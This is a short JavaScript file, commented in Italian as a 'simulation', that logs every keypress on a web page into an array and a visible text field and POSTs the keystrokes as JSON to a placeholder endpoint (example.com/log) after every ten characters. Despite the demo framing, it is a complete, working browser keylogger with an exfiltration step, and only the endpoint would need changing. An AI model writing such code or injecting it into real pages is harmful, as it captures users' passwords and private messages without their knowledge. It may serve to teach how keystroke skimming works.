const log = [];

document.addEventListener('keydown', function(event) {
    log.push(event.key);
    document.getElementById('logOutput').value = log.join('');

    // Simulazione invio dati ogni 10 caratteri
    if (log.length % 10 === 0) {
        simulateSend(log);
    }
});

function simulateSend(data) {
    // Simulazione POST verso un endpoint fittizio
    fetch('https://example.com/log', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ keystrokes: data })
    })
    .then(() => {
        console.log("Simulated send:", data);
    })
    .catch(err => {
        console.error("Simulation failed:", err);
    });
}
